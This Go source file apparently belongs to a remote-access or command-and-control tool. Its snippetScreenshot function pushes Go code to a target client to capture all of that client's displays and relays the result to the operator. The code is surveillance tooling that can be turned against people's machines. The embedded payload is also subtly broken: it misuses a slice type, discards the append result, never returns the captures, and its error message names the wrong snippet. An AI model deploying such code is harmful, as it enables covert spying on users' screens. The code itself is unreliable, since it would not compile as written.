package snippets

import (
	"fmt"
	"strings"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith_module_comosum/cmd/pc3/lib"
)

func snippetScreenshot(ctx lib.CommandContext, arg string) (string, error) {
	target, _, _ := strings.Cut(arg, " ")
	res, err := sendReqAwaitResponse(ctx, target, []byte(`
package main

import (
	"github.com/kbinani/screenshot"
	"image/png"
	"os"
	"fmt"
	"bytes"
)

func main() {
	n := screenshot.NumActiveDisplays()

	screenshots := []bytes.Buffer
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		buf := new(bytes.Buffer)
		png.Encode(buf, img)
		append(screenshots, buf)
	}

}
`), time.Second*2)
	if err != nil {
		return "", fmt.Errorf("failed to execute `info` snippet for client `%s` due to error: %s", target, err.Error())
	}

	return fmt.Sprintf("client response from `%s`: %s", target, string(res.Payload)), nil
}
